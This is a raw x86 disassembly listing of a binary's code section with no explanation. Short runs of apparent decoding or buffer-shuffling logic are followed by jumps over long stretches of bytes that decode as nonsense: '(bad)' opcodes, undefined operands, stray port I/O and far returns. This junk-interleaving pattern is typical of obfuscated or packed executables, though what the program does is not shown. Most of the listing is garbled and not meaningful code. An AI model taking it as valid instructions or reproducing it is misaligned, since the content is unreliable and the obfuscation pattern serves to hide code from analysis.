  40c92b:	pop    ss
  40c92c:	loop   0x40c929
  40c92e:	aas    
  40c92f:	sub    eax,0xba0aa169
  40c934:	jle    0x40c95d
  40c936:	pop    edi
  40c937:	adc    ch,BYTE PTR [esi+0x775306cf]
  40c93d:	aaa    
  40c93e:	mov    dh,0xca
  40c940:	mov    al,ds:0x70a87346
  40c945:	add    edx,DWORD PTR [ebp-0x14]
  40c948:	mov    edi,DWORD PTR [ebp-0x1c]
  40c94b:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c952:	mov    BYTE PTR [ebp+0xf],dl
  40c955:	mov    edx,DWORD PTR [ebp-0xc]
  40c958:	xor    edx,eax
  40c95a:	add    edx,DWORD PTR [ebp-0x14]
  40c95d:	mov    edi,DWORD PTR [ebp-0x1c]
  40c960:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c967:	mov    BYTE PTR [ebp+0xb],dl
  40c96a:	mov    dl,BYTE PTR [ebp+0xf]
  40c96d:	mov    edi,DWORD PTR [ebp-0xc]
  40c970:	xor    edi,eax
  40c972:	add    edi,DWORD PTR [ebp-0x14]
  40c975:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c978:	mov    BYTE PTR [edi+ebx*1+0x327299],dl
  40c97f:	mov    dl,BYTE PTR [ebp+0xb]
  40c982:	mov    edi,DWORD PTR [ebp-0x18]
  40c985:	xor    edi,eax
  40c987:	add    edi,DWORD PTR [ebp-0x14]
  40c98a:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c98d:	jmp    0x40cda4
  40c992:	and    ebx,DWORD PTR [eax]
  40c994:	mov    al,0x9c
  40c996:	mov    ebp,0xbca9239c
  40c99b:	jne    0x40c9bf
  40c99d:	psubusb mm3,mm1
  40c9a0:	scas   eax,DWORD PTR es:[edi]
  40c9a1:	addr16 retf 0x7e92
  40c9a5:	jle    0x40ca17
  40c9a7:	jns    0x40ca27
  40c9a9:	jle    0x40c93f
  40c9ab:	xor    BYTE PTR [eax+ecx*8+0x32039c44],al
  40c9b2:	lods   eax,DWORD PTR ds:[esi]
  40c9b3:	add    eax,0x5a3794a3
  40c9b8:	lods   eax,DWORD PTR ds:[esi]
  40c9b9:	ds dec eax
  40c9bb:	mov    ebp,0x440b027b
  40c9c0:	ja     0x40c9e7
  40c9c2:	in     eax,0x2c
  40c9c4:	mov    dl,ch
  40c9c6:	mov    ebp,0xba8e9e23
  40c9cb:	scas   al,BYTE PTR es:[edi]
  40c9cc:	sub    al,0x67
  40c9ce:	sahf   
  40c9cf:	jp     0x40ca00
  40c9d1:	paddw  mm3,QWORD PTR [ebx-0x1e]
  40c9d5:	out    dx,eax
  40c9d6:	pop    ebp
  40c9d7:	pop    ebp
  40c9d8:	add    al,0x98
  40c9da:	ds dec ebp
  40c9dc:	sbb    al,0x2d
  40c9de:	daa    
  40c9df:	xchg   ebx,eax
  40c9e0:	es sbb ah,dl
  40c9e3:	jmp    0x40c9d7
  40c9e5:	add    al,0x20
  40c9e7:	pop    edi
  40c9e8:	add    DWORD PTR [edx+0x0],edi
  40c9eb:	dec    esi
  40c9ec:	icebp  
  40c9ed:	jno    0x40c99d
  40c9ef:	jg     0x40ca04
  40c9f1:	cdq    
  40c9f2:	ret    0x15a6
  40c9f5:	jle    0x40ca63
  40c9f7:	enter  0xd6ac,0xcb
  40c9fb:	push   edx
  40c9fc:	pop    edi
  40c9fd:	retf   0x15d9
  40ca00:	add    edi,DWORD PTR [ebp+0x14]
  40ca03:	aad    0x8e
  40ca05:	mov    ah,0x92
  40ca07:	adc    al,0x57
  40ca09:	imul   edx,DWORD PTR [edx],0x27
  40ca0c:	push   ebp
  40ca0d:	es daa 
  40ca0f:	(bad)  
  40ca10:	pop    ecx
  40ca11:	fild   QWORD PTR [edx-0x2a057150]
  40ca17:	mov    ah,0x71
  40ca19:	sbb    eax,DWORD PTR [edi]
  40ca1b:	scas   al,BYTE PTR es:[edi]
  40ca1c:	add    dl,bh
  40ca1e:	inc    ebp
  40ca1f:	dec    al
  40ca21:	rep ins BYTE PTR es:[edi],dx
  40ca23:	add    eax,esi
  40ca25:	stc    
  40ca26:	jbe    0x40ca06
  40ca28:	pop    ebp
  40ca29:	jp     0x40caa7
  40ca2b:	fild   WORD PTR [edi-0x3d6bb122]
  40ca31:	mov    esi,0x4b281971
  40ca36:	fisub  DWORD PTR [eax]
  40ca38:	fcom   QWORD PTR [eax]
  40ca3a:	leave  
  40ca3b:	std    
  40ca3c:	or     eax,esi
  40ca3e:	int3   
  40ca3f:	jb     0x40ca79
  40ca41:	jae    0x40ca42
  40ca43:	adc    eax,0x555a8a3
  40ca48:	push   ss
  40ca49:	cdq    
  40ca4a:	ins    DWORD PTR es:[edi],dx
  40ca4b:	jecxz  0x40ca64
  40ca4d:	sti    
  40ca4e:	aad    0x1b
  40ca50:	std    
  40ca51:	mov    edx,DWORD PTR [edx]
  40ca53:	mov    eax,0xe480a0a8
  40ca58:	dec    ecx
  40ca59:	or     eax,esi
  40ca5b:	daa    
  40ca5c:	not    BYTE PTR [ecx+0x42]
  40ca5f:	jb     0x40ca26
  40ca61:	cdq    
  40ca62:	lock sub DWORD PTR [eax],ebx
  40ca65:	mov    esi,0x1be99246
  40ca6a:	sti    
  40ca6b:	inc    esp
  40ca6c:	in     al,0x23
  40ca6e:	ins    BYTE PTR es:[edi],dx
  40ca6f:	ficomp DWORD PTR [ecx+0x6bb1b42a]
  40ca75:	leave  
  40ca76:	fild   WORD PTR [edi]
  40ca78:	add    BYTE PTR [eax-0x17],dl
  40ca7b:	xchg   ebp,eax
  40ca7c:	sub    eax,0xea2f56ae
  40ca81:	sub    al,0x1e
  40ca83:	out    0xe7,eax
  40ca85:	mov    esi,DWORD PTR [edx+0x14fd37df]
  40ca8b:	int    0xed
  40ca8d:	sub    al,0x7d
  40ca8f:	sar    DWORD PTR [edi-0x50],cl
  40ca92:	stos   BYTE PTR es:[edi],al
  40ca93:	leave  
  40ca94:	in     eax,dx
  40ca95:	fmulp  st(5),st
  40ca97:	test   DWORD PTR [eax],ebp
  40ca99:	push   ebx
  40ca9a:	push   ecx
  40ca9b:	or     eax,0xb048415a
  40caa0:	out    dx,eax
  40caa1:	jnp    0x40cb10
  40caa3:	xchg   esi,eax
  40caa4:	sub    BYTE PTR [edx+0x32],dh
  40caa7:	lods   eax,DWORD PTR ds:[esi]
  40caa8:	inc    edx
  40caa9:	push   ebp
  40caaa:	adc    DWORD PTR [ecx],esp
  40caac:	mov    ds:0x346391e,eax
  40cab1:	push   ecx
  40cab2:	lds    edx,FWORD PTR [esi-0x6db761cf]
  40cab8:	or     al,0x35
  40caba:	push   eax
  40cabb:	fstp   TBYTE PTR [edi-0x799492bd]
  40cac1:	xchg   esp,eax
  40cac2:	pop    es
  40cac3:	sti    
  40cac4:	pmullw mm6,mm0
  40cac7:	cmp    eax,0x493853d1
  40cacc:	sbb    al,0x1c
  40cace:	or     dh,al
  40cad0:	retf   0x362c
  40cad3:	addr16 cmc 
  40cad5:	loopne 0x40cb20
  40cad7:	pop    esp
  40cad8:	xor    al,0x63
  40cada:	stc    
  40cadb:	inc    eax
  40cadc:	(bad)  
  40cadd:	mov    dh,BYTE PTR [esi]
  40cadf:	mov    eax,0x3f9c2d6
  40cae4:	mov    ch,0x96
  40cae6:	test   al,0x72
  40cae8:	repz push ds
  40caea:	xor    eax,0x45f808a6
  40caef:	mov    edi,0x684d6dbc
  40caf4:	cs jnp 0x40cb72
  40caf7:	push   ebx
  40caf8:	rol    al,0xa8
  40cafb:	out    0x38,eax
  40cafd:	sbb    esi,DWORD PTR [edi-0x48e2a1f5]
  40cb03:	jecxz  0x40cb82
  40cb05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb06:	gs ja  0x40cb61
  40cb09:	sbb    dh,al
  40cb0b:	mov    DWORD PTR [ebx],eax
  40cb0d:	adc    DWORD PTR [eax+0x63],eax
  40cb10:	xchg   ecx,eax
  40cb11:	jge    0x40ca9d
  40cb13:	add    eax,DWORD PTR [edx+ebx*1-0x7e91b413]
  40cb1a:	xchg   edi,eax
  40cb1b:	adc    BYTE PTR [ebp-0x63],0x35
  40cb1f:	or     ch,bh
  40cb21:	pushf  
  40cb22:	cmp    BYTE PTR [ecx+ebx*8+0x6e],bl
  40cb26:	xchg   ecx,eax
  40cb27:	stc    
  40cb28:	or     DWORD PTR [edi-0x52],0xffffffc1
  40cb2c:	loopne 0x40cba6
  40cb2e:	aaa    
  40cb2f:	(bad)  
  40cb30:	lock or al,ch
  40cb33:	jl     0x40cb88
  40cb35:	xchg   ecx,eax
  40cb36:	push   ebx
  40cb37:	push   ds
  40cb38:	mov    edx,0x2c61fd5b
  40cb3d:	mov    edx,0xa180a923
  40cb42:	mov    bl,0x1b
  40cb44:	jnp    0x40cb80
  40cb46:	or     eax,0x46731921
  40cb4b:	mov    dl,0x5c
  40cb4d:	xor    eax,esp
  40cb4f:	jo     0x40cba5
  40cb51:	icebp  
  40cb52:	jno    0x40cae2
  40cb54:	(bad)  [ebx+eax*8-0x2cf6acb5]
  40cb5b:	jns    0x40cbc1
  40cb5d:	push   eax
  40cb5e:	jl     0x40cbc9
  40cb60:	sahf   
  40cb61:	cvtdq2ps xmm1,xmm4
  40cb64:	pusha  
  40cb65:	adc    eax,0x18b93b0f
  40cb6a:	mov    esp,0xa73f68f3
  40cb6f:	mov    cl,0x3d
  40cb71:	mov    ?,ebx
  40cb73:	ret    
  40cb74:	fmul   DWORD PTR [edx]
  40cb76:	add    al,0xc3
  40cb78:	stc    
  40cb79:	adc    al,0x1c
  40cb7b:	inc    edi
  40cb7c:	(bad)  
  40cb7d:	fdivr  DWORD PTR [ecx]
  40cb7f:	sub    bh,BYTE PTR [esi-0x1f]
  40cb82:	out    dx,al
  40cb83:	sub    DWORD PTR [ebp-0x12],ebx
  40cb86:	ds and al,0xed
  40cb89:	aaa    
  40cb8a:	jecxz  0x40cb80
  40cb8c:	sbb    eax,0x5d5337a2
  40cb91:	mov    ds:0x3911f9aa,al
  40cb96:	sub    BYTE PTR [esi],ch
  40cb98:	pop    eax
  40cb99:	adc    DWORD PTR [eax+ebp*2-0x60],ecx
  40cb9d:	fsubr  QWORD PTR [esi]
  40cb9f:	fwait
  40cba0:	out    dx,eax
  40cba1:	jecxz  0x40cb9e
  40cba3:	scas   eax,DWORD PTR es:[edi]
  40cba4:	xchg   ebx,eax
  40cba5:	inc    ecx
  40cba6:	test   DWORD PTR [edx],esi
  40cba8:	test   al,0x96
  40cbaa:	popf   
  40cbab:	or     ecx,ebp
  40cbad:	dec    ebp
  40cbae:	(bad)  
  40cbaf:	in     al,dx
  40cbb0:	fnstcw WORD PTR [esp+ebp*4+0x5dec95e0]
  40cbb7:	push   edi
  40cbb8:	add    ecx,DWORD PTR [esi-0x1706a07]
  40cbbe:	and    eax,0x25a81e13
  40cbc3:	imul   esi,DWORD PTR [edx],0x4769d567
  40cbc9:	push   eax
  40cbca:	sbb    BYTE PTR [edx+eax*2+0x24],bl
  40cbce:	push   0x21d951d2
  40cbd3:	push   0xe48681c7
  40cbd8:	repnz fsub DWORD PTR [edx-0x47aed893]
  40cbdf:	or     BYTE PTR [eax+ecx*1],bl
  40cbe2:	mov    bh,0xeb
  40cbe4:	scas   al,BYTE PTR es:[edi]
  40cbe5:	pop    esp
  40cbe6:	sub    al,0xd9
  40cbe8:	or     BYTE PTR [ebx],cl
  40cbea:	ret    
  40cbeb:	dec    edi
  40cbec:	pop    edx
  40cbed:	push   ecx
  40cbee:	push   ebx
  40cbef:	and    dl,bl
  40cbf1:	es (bad) 
  40cbf3:	ins    BYTE PTR es:[edi],dx
  40cbf4:	cmc    
  40cbf5:	xchg   edx,eax
  40cbf6:	iret   
  40cbf7:	into   
  40cbf8:	enter  0xedc,0xd
  40cbfc:	mov    ds:0x65aebe3,al
  40cc01:	add    eax,0x823dfc77
  40cc06:	xor    al,BYTE PTR [ebp-0x6d]
  40cc09:	loope  0x40cc3f
  40cc0b:	push   0x6d2a10f9
  40cc10:	(bad)  
  40cc11:	rcr    DWORD PTR [esi+eiz*4],cl
  40cc14:	sub    eax,0x917ea7fc
  40cc19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc1b:	pop    edi
  40cc1c:	dec    esp
  40cc1d:	jmp    0x40cc04
  40cc1f:	mov    ds:0xb969cd0b,eax
  40cc24:	inc    esp
  40cc25:	(bad)  
  40cc26:	dec    DWORD PTR ds:0xf5d859ae
  40cc2c:	push   cs
  40cc2d:	pop    eax
  40cc2e:	pusha  
  40cc2f:	or     DWORD PTR [ebp+eiz*1+0x4],0x975efd0f
  40cc37:	xchg   ecx,eax
  40cc38:	push   es
  40cc39:	in     al,dx
  40cc3a:	(bad)  
  40cc3b:	xor    BYTE PTR [eax-0x46],bh
  40cc3e:	push   ebp
  40cc3f:	jb     0x40cc1b
  40cc41:	xor    bl,ch
  40cc43:	dec    ebx
  40cc44:	push   eax
  40cc45:	dec    edx
  40cc46:	fdivr  DWORD PTR [eax]
  40cc48:	gs inc esi
  40cc4a:	pop    edi
  40cc4b:	or     BYTE PTR [ebx+eiz*8-0x18],bl
  40cc4f:	mov    BYTE PTR [edi],ch
  40cc51:	mov    al,0xeb
  40cc53:	(bad)  
  40cc54:	cmp    BYTE PTR [ebx+ebp*1+0x3fa1ed0f],bl
  40cc5b:	jg     0x40ccd6
  40cc5d:	hlt    
  40cc5e:	test   al,0xfd
  40cc60:	mov    ebp,0xbb65b303
  40cc65:	mov    al,0x50
  40cc67:	mov    ?,WORD PTR [esi]
  40cc69:	pusha  
  40cc6a:	mov    al,ds:0x6dffd0ed
  40cc6f:	dec    esp
  40cc70:	xor    al,0xbc
  40cc72:	mov    esi,ds
  40cc74:	and    BYTE PTR [eax-0x38b9dc7f],bh
  40cc7a:	int    0xd1
  40cc7c:	mov    ebp,0x3c96a868
  40cc81:	add    edi,DWORD PTR [edx]
  40cc83:	jns    0x40cc53
  40cc85:	add    al,0xb2
  40cc87:	pop    ebp
  40cc88:	sub    DWORD PTR [eax+0x6e5cdfa2],0x3d7c095b
  40cc92:	or     cl,bh
  40cc94:	adc    eax,ecx
  40cc96:	cmp    eax,0xd29645c9
  40cc9b:	std    
  40cc9c:	pop    edi
  40cc9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc9e:	fstp   TBYTE PTR [ebp-0x1c3364e6]
  40cca4:	mov    dh,0x5a
  40cca6:	inc    ebx
  40cca7:	dec    edx
  40cca8:	or     eax,0x655eff8f
  40ccad:	sbb    al,0xa0
  40ccaf:	fs lahf 
  40ccb1:	ins    BYTE PTR es:[edi],dx
  40ccb2:	dec    edi
  40ccb3:	dec    esp
  40ccb4:	mov    esp,0x2b9acc65
  40ccb9:	dec    ebx
  40ccba:	jne    0x40cd27
  40ccbc:	and    DWORD PTR [ebx+0x6a],esp
  40ccbf:	sbb    DWORD PTR [edi-0x59],0x5f97a4ac
  40ccc6:	adc    bl,BYTE PTR [esi-0x4647a6ff]
  40cccc:	mov    dh,0x94
  40ccce:	sub    cl,0x3d
  40ccd1:	ror    ah,cl
  40ccd3:	js     0x40cd15
  40ccd5:	(bad)  
  40ccd6:	cld    
  40ccd7:	loope  0x40cc9e
  40ccd9:	cmp    BYTE PTR [esi-0x6c15a873],al
  40ccdf:	in     eax,dx
  40cce0:	add    ebx,DWORD PTR [ecx+0x94940ed]
  40cce6:	mov    al,ds:0x368b4f31
  40cceb:	in     al,dx
  40ccec:	std    
  40cced:	iret   
  40ccee:	inc    esi
  40ccef:	xchg   ebx,eax
  40ccf0:	sbb    edx,0x14
  40ccf3:	add    DWORD PTR [esi],ecx
  40ccf5:	xchg   ebx,eax
  40ccf6:	mov    bl,0x6a
  40ccf8:	mov    edx,0xd4d35b75
  40ccfd:	fcom   QWORD PTR [esi-0x6d]
  40cd00:	sbb    eax,0xa9f5e4d8
  40cd05:	in     al,0xf2
  40cd07:	fsubp  st(2),st
  40cd09:	sub    al,0xe6
  40cd0b:	adc    dl,al
  40cd0d:	jae    0x40cc9d
  40cd0f:	add    ah,BYTE PTR [edx]
  40cd11:	pop    eax
  40cd12:	mov    BYTE PTR [edi-0x5724c463],ch
  40cd18:	cmp    DWORD PTR [ebx+0x1bbf7ed9],edx
  40cd1e:	stos   DWORD PTR es:[edi],eax
  40cd1f:	mov    ah,0x69
  40cd21:	sti    
  40cd22:	and    DWORD PTR [esi+0x52ca71e6],0x6eb774d8
  40cd2c:	sbb    al,0xb
  40cd2e:	jmp    DWORD PTR [esi+ebx*4+0x432f5190]
  40cd35:	and    ah,BYTE PTR [edi-0x43b6ce47]
  40cd3b:	neg    BYTE PTR [ecx+0x4b]
  40cd3e:	jg     0x40cd29
  40cd40:	call   0x99af1e3e
  40cd45:	lods   al,BYTE PTR ds:[esi]
  40cd46:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd48:	mov    ebx,0x25e9f209
  40cd4d:	push   ecx
  40cd4e:	fs adc eax,ebx
  40cd51:	ins    BYTE PTR es:[edi],dx
  40cd52:	pop    ebp
  40cd53:	rol    dh,1
  40cd55:	imul   esp,DWORD PTR [ebp-0x65],0x8a602de
  40cd5c:	mov    WORD PTR [edx-0x6e009987],cs
  40cd62:	mov    eax,ds:0x601b1c5f
  40cd67:	inc    ebp
  40cd68:	arpl   WORD PTR [ebx-0x45],cx
  40cd6b:	dec    esp
  40cd6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd6d:	or     al,0x56
  40cd6f:	inc    edi
  40cd70:	int3   
  40cd71:	dec    eax
  40cd72:	xor    BYTE PTR [eax-0x10b2947e],bl
  40cd78:	dec    esi
  40cd79:	sbb    al,cl
  40cd7b:	fistp  WORD PTR [ebx+ebp*8]
  40cd7e:	mov    ds:0x65ad90a5,al
  40cd83:	repnz out 0xaa,eax
  40cd86:	sbb    al,0xcc
  40cd88:	ficom  DWORD PTR [ebp-0x6b]
  40cd8b:	ror    dh,1
  40cd8d:	sub    esi,edx
  40cd8f:	pop    ebx
  40cd90:	sbb    al,0x6e
  40cd92:	bound  esi,QWORD PTR [ebp+0x3]
  40cd95:	and    DWORD PTR [eax],eax
  40cd97:	jnp    0x40cd77
  40cd99:	mov    bl,BYTE PTR [ecx-0x70]
  40cd9c:	sahf   
  40cd9d:	sbb    al,0xd1
  40cd9f:	xor    DWORD PTR [eax+0x21],edx
  40cda2:	pop    esi
  40cda3:	mov    ah,0x88
  40cda5:	xchg   esp,eax
  40cda6:	pop    ds
  40cda7:	cdq    
  40cda8:	jb     0x40cddc
  40cdaa:	add    BYTE PTR [ebx+0x7d8bbc55],cl
  40cdb0:	hlt    
  40cdb1:	xor    edx,eax
  40cdb3:	xor    edi,eax
  40cdb5:	add    edx,ecx
  40cdb7:	add    edi,ecx
  40cdb9:	imul   edx,edi
  40cdbc:	add    edx,DWORD PTR [ebp-0x14]
  40cdbf:	mov    DWORD PTR [ebp-0x14],edx
  40cdc2:	mov    edx,DWORD PTR [ebp-0xc]
  40cdc5:	mov    edi,DWORD PTR [ebp-0x24]
  40cdc8:	jmp    0x40d1df
  40cdcd:	push   ebp
  40cdce:	and    DWORD PTR [edx+esi*8],eax
  40cdd1:	jl     0x40cdc6
  40cdd3:	jge    0x40cd76
  40cdd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdd6:	sbb    esi,DWORD PTR [eax+0x58]
  40cdd9:	jo     0x40ce40
  40cddb:	icebp  
  40cddc:	ror    esp,0x9e
  40cddf:	jle    0x40ce5f
  40cde1:	jo     0x40ce5c
  40cde3:	jle    0x40ce63
  40cde5:	call   0xa8dbca38
  40cdea:	ror    DWORD PTR [eax],0xe5
  40cded:	dec    edi
  40cdee:	lods   al,BYTE PTR ds:[esi]
  40cdef:	push   ss
  40cdf0:	das    
  40cdf1:	outs   dx,BYTE PTR ds:[esi]
  40cdf2:	or     edi,DWORD PTR [esi-0x6afa52e0]
  40cdf8:	xchg   edx,eax
  40cdf9:	and    eax,0x3d27c71
  40cdfe:	test   BYTE PTR [ecx-0x66b97882],ch
  40ce04:	jmp    0x40ce26
  40ce06:	shl    esi,1
  40ce08:	fist   WORD PTR [edx-0x4be7a1fa]
  40ce0e:	mov    eax,ds:0x3e885299
  40ce13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce14:	sub    eax,0xe0272fde
  40ce19:	loope  0x40ce0a
  40ce1b:	scas   eax,DWORD PTR es:[edi]
  40ce1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce1d:	nop
  40ce1e:	mov    ebx,0xd4aff7ff
  40ce23:	lods   al,BYTE PTR ds:[esi]
  40ce24:	push   0xc29dc7a2
  40ce29:	adc    al,0x7d
  40ce2b:	pop    ebx
  40ce2c:	xchg   DWORD PTR [ebx+ebx*8+0x64494bad],esp
  40ce33:	out    0x8f,eax
  40ce35:	xor    dh,BYTE PTR [ebp+0x53]
  40ce38:	sbb    DWORD PTR ds:[edx+0x42],0x67
  40ce3d:	xlat   BYTE PTR ds:[ebx]
  40ce3e:	add    dl,al
  40ce40:	pop    DWORD PTR [ebx-0x5e60fd6a]
  40ce46:	sbb    al,0x82
  40ce48:	pop    ss
  40ce49:	scas   eax,DWORD PTR es:[edi]
  40ce4a:	push   ss
  40ce4b:	std    
  40ce4c:	sbb    eax,0x9350977b
  40ce51:	cmp    al,0xc1
  40ce53:	loope  0x40ce7a
  40ce55:	sbb    ch,0x9c
  40ce58:	mov    ds:0xcdd20c39,al
  40ce5d:	dec    edx
  40ce5e:	outs   dx,DWORD PTR ds:[esi]
  40ce5f:	inc    eax
  40ce60:	(bad)  
  40ce61:	ins    DWORD PTR es:[edi],dx
  40ce62:	mov    edi,0x7c0120c1
  40ce67:	outs   dx,DWORD PTR ds:[esi]
  40ce68:	add    esi,edx
  40ce6a:	cli    
  40ce6b:	lahf   
  40ce6c:	ja     0x40ce02
  40ce6e:	lds    esi,FWORD PTR [edi+0x79]
  40ce71:	adc    ecx,DWORD PTR [edi-0x3b5ce39]
  40ce77:	add    DWORD PTR [ecx+0x3ad90f78],ebp
  40ce7d:	push   ecx
  40ce7e:	mov    gs,esi
  40ce80:	jecxz  0x40cec8
  40ce82:	jo     0x40ceae
  40ce84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce85:	repz loop 0x40ce7b
  40ce88:	sbb    ah,BYTE PTR [ecx]
  40ce8a:	int    0x92
  40ce8c:	push   edx
  40ce8d:	in     eax,dx
  40ce8e:	sar    DWORD PTR [eax+0x7b],0xf4
  40ce92:	xchg   esp,eax
  40ce93:	je     0x40cf07
  40ce95:	lods   al,BYTE PTR ds:[esi]
  40ce96:	sbb    BYTE PTR [edx+0xf1c15e7],al
  40ce9c:	nop
  40ce9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce9e:	test   DWORD PTR [eax],esp
  40cea0:	mov    fs,WORD PTR [esi+ecx*1+0x82bea1a]
  40cea7:	out    0x3b,al
  40cea9:	pop    esi
  40ceaa:	outs   dx,BYTE PTR ds:[esi]
  40ceab:	xor    edi,0xffffff9d
  40ceae:	add    al,0xbc
  40ceb0:	aad    0x33
  40ceb2:	add    al,0x36
  40ceb4:	in     al,dx
  40ceb5:	sbb    BYTE PTR [ebp-0x1c],0x27
  40ceb9:	ret    0xfc18
  40cebc:	and    cl,BYTE PTR [eax]
  40cebe:	mov    ebp,0xddecc171
  40cec3:	mov    bh,0x50
  40cec5:	lods   al,BYTE PTR cs:[esi]
  40cec7:	addr16 (bad) 
  40cec9:	mov    edx,DWORD PTR [eax+0x7d]
  40cecc:	sbb    DWORD PTR [edx-0x49706854],ebp
  40ced2:	sbb    al,0xed
  40ced4:	test   DWORD PTR [eax+edi*1-0x2b],ebp
  40ced8:	(bad)  
  40ced9:	not    BYTE PTR [ebp-0x1]
  40cedc:	lods   eax,DWORD PTR ds:[esi]
  40cedd:	cmp    BYTE PTR [edi+0x25],0xfb
  40cee1:	pop    ds
  40cee2:	ret    0x1959
  40cee5:	aam    0x45
  40cee7:	xchg   esp,eax
  40cee8:	test   BYTE PTR [ebx-0x10fc87d9],bl
  40ceee:	scas   al,BYTE PTR es:[edi]
  40ceef:	pop    edi
  40cef0:	lods   al,BYTE PTR ds:[esi]
  40cef1:	shl    BYTE PTR [edx+0x4c],1
  40cef4:	std    
  40cef5:	xchg   ebp,eax
  40cef6:	or     DWORD PTR [ecx-0xb],esp
  40cef9:	icebp  
  40cefa:	into   
  40cefb:	adc    edi,esp
  40cefd:	mov    eax,ds:0x8018ddae
  40cf02:	mov    dl,0x62
  40cf04:	mov    edx,0xbac686b7
  40cf09:	mov    bl,0x2e
  40cf0b:	fidiv  DWORD PTR gs:[esp+ebp*2]
  40cf0f:	mov    ebx,0x19463369
  40cf14:	pop    edx
  40cf15:	or     BYTE PTR [edx-0x43],dh
  40cf18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf19:	inc    ebp
  40cf1a:	mov    ebx,0x2931260e
  40cf1f:	clc    
  40cf20:	mov    dh,ch
  40cf22:	repnz xor DWORD PTR [eax-0x62b620b4],ecx
  40cf29:	fs daa 
  40cf2b:	pop    esi
  40cf2c:	jb     0x40cfa2
  40cf2e:	dec    esp
  40cf2f:	nop
  40cf30:	dec    esi
  40cf31:	mov    ds:0xbf5cdc17,al
  40cf36:	sub    ch,BYTE PTR [eax]
  40cf38:	bnd gs jne 0x40cf1c
  40cf3c:	loop   0x40cedd
  40cf3e:	inc    esi
  40cf3f:	xchg   ebx,eax
  40cf40:	sub    dh,BYTE PTR [edi-0x771ced13]
  40cf46:	inc    ebx
  40cf47:	jp     0x40cf0e
  40cf49:	and    DWORD PTR [edx+0x61],ebx
  40cf4c:	gs xor eax,0x44653beb
  40cf52:	mov    ds:0x762b07c1,al
  40cf57:	enter  0xef9d,0xef
  40cf5b:	or     BYTE PTR [ebx+0x5c],al
  40cf5e:	int3   
  40cf5f:	sub    DWORD PTR [ecx],edi
  40cf61:	iret   
  40cf62:	push   eax
  40cf63:	test   eax,0x9f5e5789
  40cf68:	cmc    
  40cf69:	leave  
  40cf6a:	icebp  
  40cf6b:	push   edx
  40cf6c:	sbb    BYTE PTR [ebx+0x24],0xb6
  40cf70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf71:	mov    eax,0x7c17d6e7
  40cf76:	je     0x40cf7d
  40cf78:	test   al,0x3
  40cf7a:	cmp    ah,bl
  40cf7c:	or     eax,0xe847b041
  40cf81:	push   ds
  40cf82:	add    ecx,DWORD PTR [edx-0x7151dd91]
  40cf88:	xor    DWORD PTR [ecx+edx*2],0x42aec107
  40cf8f:	push   cs
  40cf90:	dec    esi
  40cf91:	mov    bh,0xa6
  40cf93:	and    al,0xcb
  40cf95:	jl     0x40cfa5
  40cf97:	jo     0x40d000
  40cf99:	fwait
  40cf9a:	dec    ebx
  40cf9b:	jge    0x40cfca
  40cf9d:	enter  0xf2fb,0x94
  40cfa1:	adc    DWORD PTR [edx-0x268a7c5c],eax
  40cfa7:	push   0xa9613798
  40cfac:	out    0x47,eax
  40cfae:	mov    ebp,0xe65f8cf6
  40cfb3:	lock fnstcw WORD PTR [ecx]
  40cfb6:	es fstp TBYTE PTR es:[ecx+0x5c25d9e4]
  40cfbe:	pop    ss
  40cfbf:	inc    edx
  40cfc0:	push   es
  40cfc1:	(bad)  
  40cfc3:	daa    
  40cfc4:	jmp    0xa736:0xf8668b00
  40cfcb:	je     0x40cf9e
  40cfcd:	fadd   st(6),st
  40cfcf:	sbb    al,0xb9
  40cfd1:	test   al,0x16
  40cfd3:	lock bound ebx,QWORD PTR [si+0x475c]
  40cfd9:	(bad)  
  40cfdb:	loopne 0x40d012
  40cfdd:	add    eax,0xa7f5250a
  40cfe2:	adc    edi,edx
  40cfe4:	out    dx,eax
  40cfe5:	mov    eax,gs
  40cfe7:	jle    0x40d02f
  40cfe9:	sbb    BYTE PTR [eax+ebp*8],cl
  40cfec:	retf   0x32c2
  40cfef:	in     eax,dx
  40cff0:	shl    DWORD PTR [edx],cl
  40cff2:	fs ja  0x40d06f
  40cff5:	inc    eax
  40cff6:	pop    ebp
  40cff7:	fiadd  WORD PTR [esi]
  40cff9:	in     eax,0x8c
  40cffb:	dec    eax
  40cffc:	rol    BYTE PTR [ecx-0x1aa31781],1
  40d002:	adc    ecx,DWORD PTR [edi]
  40d004:	sbb    al,0x85
  40d006:	adc    bl,BYTE PTR [edx-0x356fd55b]
  40d00c:	scas   al,BYTE PTR es:[edi]
  40d00d:	cmp    ebp,DWORD PTR [bp+di]
  40d010:	ds daa 
  40d012:	repnz gs (bad) 
  40d015:	or     al,0x5
  40d017:	cpuid  
  40d019:	dec    esi
  40d01a:	push   eax
  40d01b:	sbb    dl,BYTE PTR [eax+0x23]
  40d01e:	ret    0x9c5e
  40d021:	retf   0x727d
  40d024:	cs (bad) 
  40d026:	fstp   st(4)
  40d028:	outs   dx,BYTE PTR ds:[esi]
  40d029:	pushf  
  40d02a:	out    dx,al
  40d02b:	lahf   
  40d02c:	ins    DWORD PTR es:[edi],dx
  40d02d:	add    al,0xae
  40d02f:	retf   0x2eb5
  40d032:	sub    DWORD PTR [ecx+0x70cfcd4c],eax
  40d038:	frstor [esi-0x38a522ab]
  40d03e:	sub    al,0x28
  40d040:	(bad)  
  40d042:	scas   al,BYTE PTR es:[edi]
  40d043:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d044:	out    dx,eax
  40d045:	xor    eax,0xc7d25aad
  40d04a:	fcmove st,st(2)
